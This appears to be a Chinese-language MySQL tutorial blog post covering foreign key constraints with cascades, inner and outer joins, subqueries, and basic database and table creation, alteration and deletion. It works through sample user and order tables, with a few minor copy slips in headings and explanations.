<p>让我们通过一个实例来解释外键。请看下面两个表：</p>
<p>Persons 表：</p>
<table>
<thead>
<tr>
<th align="center">P_Id</th>
<th align="center">LastName</th>
<th align="center">FirstName</th>
<th align="center">Address</th>
<th align="center">City</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">Hansen</td>
<td align="center">Ola</td>
<td align="center">Timoteivn 10</td>
<td align="center">Sandnes</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">Svendson</td>
<td align="center">Tove</td>
<td align="center">Borgvn 23</td>
<td align="center">Sandnes</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">Pettersen</td>
<td align="center">Kari</td>
<td align="center">Storgt 20</td>
<td align="center">Stavanger</td>
</tr>
</tbody></table>
<p>Orders 表：</p>
<table>
<thead>
<tr>
<th align="center">O_Id</th>
<th align="center">OrderNo</th>
<th align="center">P_Id</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">77895</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">44678</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">22456</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">24562</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>请注意，”Orders” 表中的 “P_Id” 列指向 “Persons” 表中的 “P_Id” 列。</p>
<p>“Persons” 表中的 “P_Id” 列是 “Persons” 表中的 PRIMARY KEY。</p>
<p>“Orders” 表中的 “P_Id” 列是 “Orders” 表中的 FOREIGN KEY。</p>
<p>FOREIGN KEY 约束用于预防破坏表之间连接的行为。</p>
<p>FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
<h5 id="CREATE-TABLE-时的-SQL-FOREIGN-KEY-约束"><a href="#CREATE-TABLE-时的-SQL-FOREIGN-KEY-约束" class="headerlink" title="CREATE TABLE 时的 SQL FOREIGN KEY 约束"></a>CREATE TABLE 时的 SQL FOREIGN KEY 约束</h5><p>下面的 SQL 在 “Orders” 表创建时在 “P_Id” 列上创建 FOREIGN KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">P_Id int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">FOREIGN KEY (P_Id) REFERENCES Persons(P_Id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">P_Id int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id) REFERENCES Persons(P_Id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="ALTER-TABLE-时的-SQL-FOREIGN-KEY-约束"><a href="#ALTER-TABLE-时的-SQL-FOREIGN-KEY-约束" class="headerlink" title="ALTER TABLE 时的 SQL FOREIGN KEY 约束"></a>ALTER TABLE 时的 SQL FOREIGN KEY 约束</h5><p>当 “Orders” 表已被创建时，在 “P_Id” 列创建 FOREIGN KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders ADD FOREIGN KEY (P_Id) REFERENCES Persons(P_Id);</span><br></pre></td></tr></table></figure>

<p>命名 FOREIGN KEY 约束，并定义多个列的 FOREIGN KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders</span><br><span class="line">ADD CONSTRAINT fk_PerOrders</span><br><span class="line">FOREIGN KEY (P_Id)</span><br><span class="line">REFERENCES Persons(P_Id)</span><br></pre></td></tr></table></figure>

<h5 id="删除-FOREIGN-KEY-约束"><a href="#删除-FOREIGN-KEY-约束" class="headerlink" title="删除 FOREIGN KEY 约束"></a>删除 FOREIGN KEY 约束</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders DROP FOREIGN KEY fk_PerOrders</span><br></pre></td></tr></table></figure>

<h5 id="外键级联操作"><a href="#外键级联操作" class="headerlink" title="外键级联操作"></a>外键级联操作</h5><p>添加外键约束，同时添加级联更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名)</span><br><span class="line">ON UPDATE CASCADE;</span><br></pre></td></tr></table></figure>

<p>添加外键约束，同时添加级联删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名)</span><br><span class="line">ON DELETE CASCADE;</span><br></pre></td></tr></table></figure>

<p>添加外键约束，同时添加级联更新和级联删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名)</span><br><span class="line">ON UPDATE CASCADE ON DELETE CASCADE;</span><br></pre></td></tr></table></figure>

<p><strong>check</strong></p>
<p>删除外键约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE orderlist DROP FOREIGN KEY ou_fk1;</span><br></pre></td></tr></table></figure>

<p>添加外键约束，同时添加级联更新和级联删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE orderlist ADD CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)</span><br><span class="line">ON UPDATE CASCADE ON DELETE CASCADE;</span><br></pre></td></tr></table></figure>

<p>将李四这个用户的 id 修改为 3，订单表中的 uid 也自动修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE USER SET id=3 WHERE id=2;</span><br></pre></td></tr></table></figure>

<p>将李四这个用户删除，订单表中的该用户所属的订单也自动删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM USER WHERE id=3;</span><br></pre></td></tr></table></figure>

<h2 id="连接（JOIN）"><a href="#连接（JOIN）" class="headerlink" title="连接（JOIN）"></a>连接（JOIN）</h2><h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建 db4 数据库</span><br><span class="line">CREATE DATABASE db4;</span><br><span class="line">-- 使用 db4 数据库</span><br><span class="line">USE db4;</span><br><span class="line"></span><br><span class="line">-- 创建 user 表</span><br><span class="line">CREATE TABLE USER(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 用户id</span><br><span class="line">NAME VARCHAR(20), -- 用户姓名</span><br><span class="line">age INT -- 用户年龄</span><br><span class="line">);</span><br><span class="line">-- 添加数据</span><br><span class="line">INSERT INTO USER VALUES (1,&#x27;张三&#x27;,23);</span><br><span class="line">INSERT INTO USER VALUES (2,&#x27;李四&#x27;,24);</span><br><span class="line">INSERT INTO USER VALUES (3,&#x27;王五&#x27;,25);</span><br><span class="line">INSERT INTO USER VALUES (4,&#x27;赵六&#x27;,26);</span><br><span class="line"></span><br><span class="line">-- 创建订单表</span><br><span class="line">CREATE TABLE orderlist(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 订单id</span><br><span class="line">number VARCHAR(30), -- 订单编号</span><br><span class="line">uid INT, -- 外键字段</span><br><span class="line">CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)</span><br><span class="line">);</span><br><span class="line">-- 添加数据</span><br><span class="line">INSERT INTO orderlist VALUES (1,&#x27;hm001&#x27;,1);</span><br><span class="line">INSERT INTO orderlist VALUES (2,&#x27;hm002&#x27;,1);</span><br><span class="line">INSERT INTO orderlist VALUES (3,&#x27;hm003&#x27;,2);</span><br><span class="line">INSERT INTO orderlist VALUES (4,&#x27;hm004&#x27;,2);</span><br><span class="line">INSERT INTO orderlist VALUES (5,&#x27;hm005&#x27;,3);</span><br><span class="line">INSERT INTO orderlist VALUES (6,&#x27;hm006&#x27;,3);</span><br><span class="line">INSERT INTO orderlist VALUES (7,&#x27;hm007&#x27;,NULL);</span><br></pre></td></tr></table></figure>

<p>orderlist：</p>
<p><img src="https://s2.loli.net/2024/04/23/95P6cD3CWM8qEaw.png" alt="image-20240423201037977"></p>
<p>uesr：</p>
<p><img src="https://s2.loli.net/2024/04/23/hz4RoLlxO23ZJ8t.png" alt="image-20240423201102957"></p>
<p>JOIN 用于把来自两个或多个表的行结合起来。</p>
<p>下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。</p>
<p><img src="https://s2.loli.net/2024/04/23/Rombr5BsO9FT1pC.png" alt="image-20240423190127034"></p>
<p>JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
<h3 id="INNER-JOIN-内连接"><a href="#INNER-JOIN-内连接" class="headerlink" title="INNER JOIN 内连接"></a>INNER JOIN 内连接</h3><p><img src="https://s2.loli.net/2024/04/23/BDcNKXpoih4qfbQ.gif" alt="img_innerjoin"></p>
<p>最常见的 JOIN 类型：<strong>INNER JOIN（简单的 JOIN）</strong>。</p>
<p>如果表中有至少一个匹配，则返回行。</p>
<p>INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">INNER JOIN table2</span><br><span class="line">ON condition;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">JOIN table2</span><br><span class="line">ON condition;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>column1, column2, …：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</li>
<li>table1：要连接的第一个表。</li>
<li>table2：要连接的第二个表。</li>
<li>condition：连接条件，用于指定连接方式。</li>
</ul>
<h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><p>查询用户信息和对应的订单信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * </span><br><span class="line">FROM USER </span><br><span class="line">INNER JOIN orderlist </span><br><span class="line">ON orderlist.uid = user.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/7p9Ns1XKu5PAUIj.png" alt="image-20240423195940895"></p>
<p>查询用户信息和对应的订单信息，并起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * </span><br><span class="line">FROM USER u </span><br><span class="line">INNER JOIN orderlist o </span><br><span class="line">ON o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/7p9Ns1XKu5PAUIj.png" alt="image-20240423195940895"></p>
<p>查询用户姓名，年龄和订单编号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	u.name, -- 用户姓名</span><br><span class="line">	u.age, -- 用户年龄</span><br><span class="line">	o.number -- 订单编号</span><br><span class="line">FROM</span><br><span class="line">	USER u -- 用户表</span><br><span class="line">INNER JOIN</span><br><span class="line">	orderlist o -- 订单表</span><br><span class="line">ON</span><br><span class="line">	o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/H1KGFtQgUkiRepb.png" alt="image-20240423200108377"></p>
<h4 id="隐式内连接"><a href="#隐式内连接" class="headerlink" title="隐式内连接"></a>隐式内连接</h4><h5 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 </span><br><span class="line">FROM 表名1,表名2 </span><br><span class="line">WHERE 关联条件;</span><br></pre></td></tr></table></figure>

<h5 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h5><p>查询用户姓名，年龄。和订单编号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	u.name, -- 用户姓名</span><br><span class="line">	u.age, -- 用户年龄</span><br><span class="line">	o.number -- 订单编号</span><br><span class="line">FROM</span><br><span class="line">	USER u, -- 用户表</span><br><span class="line">	orderlist o -- 订单表</span><br><span class="line">WHERE</span><br><span class="line">	o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/H1KGFtQgUkiRepb.png" alt="image-20240423200108377"></p>
<h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><h4 id="LEFT-JOIN-左外连接"><a href="#LEFT-JOIN-左外连接" class="headerlink" title="LEFT JOIN 左外连接"></a>LEFT JOIN 左外连接</h4><p><img src="https://www.runoob.com/wp-content/uploads/2013/09/img_leftjoin.gif" alt="SQL LEFT JOIN"></p>
<p>LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p>
<h5 id="语法-10"><a href="#语法-10" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table1</span><br><span class="line">LEFT JOIN table2</span><br><span class="line">ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table1</span><br><span class="line">LEFT OUTER JOIN table2</span><br><span class="line">ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>查询所有用户信息，以及用户对应的订单信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	u.*,</span><br><span class="line">	o.number</span><br><span class="line">FROM</span><br><span class="line">	USER u</span><br><span class="line">LEFT OUTER JOIN</span><br><span class="line">	orderlist o</span><br><span class="line">ON</span><br><span class="line">	o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/ma8c2USdYjJtrAg.png" alt="image-20240423194319742"></p>
<p>注意最后一行：没匹配记录也会显示，但是会显示 Null</p>
<p>LEFT JOIN 关键字从左表（USER）返回所有的行，即使右表（orderlist）中没有匹配。</p>
<h4 id="RIGHT-JOIN-右外连接"><a href="#RIGHT-JOIN-右外连接" class="headerlink" title="RIGHT JOIN 右外连接"></a>RIGHT JOIN 右外连接</h4><p><img src="https://www.runoob.com/wp-content/uploads/2013/09/img_rightjoin.gif" alt="SQL RIGHT JOIN"></p>
<p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。</p>
<p>如果左表中没有匹配，则结果为 NULL。</p>
<h5 id="语法-11"><a href="#语法-11" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT JOIN table2</span><br><span class="line">ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT OUTER JOIN table2</span><br><span class="line">ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<h5 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h5><p>查询所有订单信息，以及订单所属的用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	o.*,</span><br><span class="line">	u.name</span><br><span class="line">FROM</span><br><span class="line">	USER u</span><br><span class="line">RIGHT OUTER JOIN</span><br><span class="line">	orderlist o</span><br><span class="line">ON</span><br><span class="line">	o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/OdSnNVM4CTJG3qg.png" alt="image-20240423194935317"></p>
<p>注意最后一行：没匹配记录也会显示，但是会显示 Null</p>
<p>LEFT JOIN 关键字从左表（USER）返回所有的行，即使右表（orderlist）中没有匹配。</p>
<h3 id="FULL-OUTER-JOIN（MySQL-中不支持-FULL-OUTER-JOIN）"><a href="#FULL-OUTER-JOIN（MySQL-中不支持-FULL-OUTER-JOIN）" class="headerlink" title="FULL OUTER JOIN（MySQL 中不支持 FULL OUTER JOIN）"></a>FULL OUTER JOIN（MySQL 中不支持 FULL OUTER JOIN）</h3><p><img src="https://www.runoob.com/wp-content/uploads/2013/09/img_fulljoin.gif" alt="SQL FULL OUTER JOIN"></p>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><h4 id="结果是单行单列的"><a href="#结果是单行单列的" class="headerlink" title="结果是单行单列的"></a>结果是单行单列的</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名 WHERE 列名=(SELECT 列名 FROM 表名 [WHERE 条件]);</span><br></pre></td></tr></table></figure>

<p>查询年龄最高的用户姓名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MAX(age) FROM USER;</span><br><span class="line">SELECT NAME,age FROM USER WHERE age=(SELECT MAX(age) FROM USER);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/pnVamqJGQykBMxl.png" alt="image-20240423202131550"></p>
<h4 id="结果是多行单列的"><a href="#结果是多行单列的" class="headerlink" title="结果是多行单列的"></a>结果是多行单列的</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名 WHERE 列名 [NOT] IN (SELECT 列名 FROM 表名 [WHERE 条件]);</span><br></pre></td></tr></table></figure>

<p>查询张三和李四的订单信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM orderlist WHERE uid IN (1,2);</span><br><span class="line">SELECT id FROM USER WHERE NAME IN (&#x27;张三&#x27;,&#x27;李四&#x27;);</span><br><span class="line">SELECT * FROM orderlist WHERE uid IN (SELECT id FROM USER WHERE NAME IN (&#x27;张三&#x27;,&#x27;李四&#x27;));</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/iLeazFQmps9BNP7.png" alt="image-20240423202154313"></p>
<h4 id="结果是多行多列的"><a href="#结果是多行多列的" class="headerlink" title="结果是多行多列的"></a>结果是多行多列的</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名 [别名],(SELECT 列名 FROM 表名 [WHERE 条件]) [别名] [WHERE 条件];</span><br></pre></td></tr></table></figure>

<p>查询订单表中 id 大于 4 的订单信息和所属用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM orderlist WHERE id &gt; 4;</span><br><span class="line">SELECT</span><br><span class="line">	u.name,</span><br><span class="line">	o.number</span><br><span class="line">FROM</span><br><span class="line">	USER u,</span><br><span class="line">	(SELECT * FROM orderlist WHERE id &gt; 4) o</span><br><span class="line">WHERE</span><br><span class="line">	o.uid=u.id;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/WbrpXuMAZIFynD1.png" alt="image-20240423202249529"></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>

<h4 id="查询某个数据库的创建语句"><a href="#查询某个数据库的创建语句" class="headerlink" title="查询某个数据库的创建语句"></a>查询某个数据库的创建语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER DATABASE db4 CHARACTER SET utf8;</span><br></pre></td></tr></table></figure>

<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><h4 id="标准语法"><a href="#标准语法" class="headerlink" title="标准语法"></a>标准语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 数据库名称;</span><br><span class="line"># 创建 db1 数据库</span><br><span class="line">CREATE DATABASE db1;</span><br></pre></td></tr></table></figure>

<h4 id="创建数据库，判断、如果不存在则创建"><a href="#创建数据库，判断、如果不存在则创建" class="headerlink" title="创建数据库，判断、如果不存在则创建"></a>创建数据库，判断、如果不存在则创建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS 数据库名称;</span><br><span class="line"># 创建数据库 db2 (判断，如果不存在则创建)</span><br><span class="line">CREATE DATABASE IF NOT EXISTS db2;</span><br></pre></td></tr></table></figure>

<h4 id="创建数据库、并指定字符集"><a href="#创建数据库、并指定字符集" class="headerlink" title="创建数据库、并指定字符集"></a>创建数据库、并指定字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 数据库名称 CHARACTER SET 字符集名称;</span><br><span class="line"># 创建数据库 db3，并指定字符集 utf8</span><br><span class="line">CREATE DATABASE db3 CHARACTER SET utf8;</span><br></pre></td></tr></table></figure>

<p>查看 db3 数据库的字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW CREATE DATABASE db3;</span><br></pre></td></tr></table></figure>

<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><h4 id="修改数据库的字符集"><a href="#修改数据库的字符集" class="headerlink" title="修改数据库的字符集"></a>修改数据库的字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER DATABASE 数据库名称 CHARACTER SET 字符集名称;</span><br></pre></td></tr></table></figure>

<p>修改数据库 db3 的字符集为 gbk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER DATABASE db3 CHARACTER SET gbk;</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE 数据库名称;</span><br></pre></td></tr></table></figure>

<p>删除db1数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE db1;</span><br></pre></td></tr></table></figure>

<h4 id="删除数据库，判断、如果存在则删除"><a href="#删除数据库，判断、如果存在则删除" class="headerlink" title="删除数据库，判断、如果存在则删除"></a>删除数据库，判断、如果存在则删除</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE IF EXISTS 数据库名称;</span><br></pre></td></tr></table></figure>

<p>如果存在 db2 ，则删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE IF EXISTS db2;</span><br></pre></td></tr></table></figure>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="标准语法-1"><a href="#标准语法-1" class="headerlink" title="标准语法"></a>标准语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE 数据库名称;</span><br></pre></td></tr></table></figure>

<p>使用 db3 数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE db3;</span><br></pre></td></tr></table></figure>

<h4 id="查询当前使用的数据库"><a href="#查询当前使用的数据库" class="headerlink" title="查询当前使用的数据库"></a>查询当前使用的数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure>

<h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><h3 id="查询-1"><a href="#查询-1" class="headerlink" title="查询"></a>查询</h3><h4 id="查询数据库中所有数据表"><a href="#查询数据库中所有数据表" class="headerlink" title="查询数据库中所有数据表"></a>查询数据库中所有数据表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure>

<h4 id="查询表结构"><a href="#查询表结构" class="headerlink" title="查询表结构"></a>查询表结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC 表名;</span><br></pre></td></tr></table></figure>

<p>查询 user 表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC USER;</span><br></pre></td></tr></table></figure>

<h4 id="查询数据表的字符集"><a href="#查询数据表的字符集" class="headerlink" title="查询数据表的字符集"></a>查询数据表的字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLE STATUS FROM 数据库名称 LIKE &#x27;表名&#x27;;</span><br></pre></td></tr></table></figure>

<p>查看 mysql 数据库中 user 表字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLE STATUS FROM mysql LIKE &#x27;user&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h3><h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE 表名(</span><br><span class="line"></span><br><span class="line">列名 数据类型 约束,</span><br><span class="line"></span><br><span class="line">列名 数据类型 约束,</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">列名 数据类型 约束</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>创建一个 product 商品表（商品编号、商品名称、商品价格、商品库存、上架时间）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE product(</span><br><span class="line"></span><br><span class="line">id INT,</span><br><span class="line"></span><br><span class="line">NAME VARCHAR(20),</span><br><span class="line"></span><br><span class="line">price DOUBLE,</span><br><span class="line"></span><br><span class="line">stock INT,</span><br><span class="line"></span><br><span class="line">insert_time DATE</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>查看 product 表详细结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC product;</span><br></pre></td></tr></table></figure>

<h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><h4 id="给表添加列"><a href="#给表添加列" class="headerlink" title="给表添加列"></a>给表添加列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 列名 数据类型;</span><br></pre></td></tr></table></figure>

<p>给 product 表添加一列 color</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product ADD color VARCHAR(10);</span><br></pre></td></tr></table></figure>

<h3 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h3><h4 id="修改表名-1"><a href="#修改表名-1" class="headerlink" title="修改表名"></a>修改表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 旧表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>

<p>修改 product 表名为 product2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product RENAME TO product2;</span><br></pre></td></tr></table></figure>

<h4 id="修改表的字符集"><a href="#修改表的字符集" class="headerlink" title="修改表的字符集"></a>修改表的字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 CHARACTER SET 字符集名称;</span><br></pre></td></tr></table></figure>

<p>查看 db3 数据库中 product2 数据表字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLE STATUS FROM db3 LIKE &#x27;product2&#x27;;</span><br></pre></td></tr></table></figure>

<p>修改 product2 数据表字符集为 gbk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product2 CHARACTER SET gbk;</span><br></pre></td></tr></table></figure>

<h4 id="修改表中列的数据类型"><a href="#修改表中列的数据类型" class="headerlink" title="修改表中列的数据类型"></a>修改表中列的数据类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY 列名 数据类型;</span><br></pre></td></tr></table></figure>

<p>将 color 数据类型修改为 int</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product2 MODIFY color INT;</span><br></pre></td></tr></table></figure>

<p>查看 product2 表详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC product2;</span><br></pre></td></tr></table></figure>

<h4 id="修改表中列的名称和数据类型"><a href="#修改表中列的名称和数据类型" class="headerlink" title="修改表中列的名称和数据类型"></a>修改表中列的名称和数据类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE 旧列名 新列名 数据类型;</span><br></pre></td></tr></table></figure>

<p>将 color 修改为 address</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product2 CHANGE color address VARCHAR(200);</span><br></pre></td></tr></table></figure>

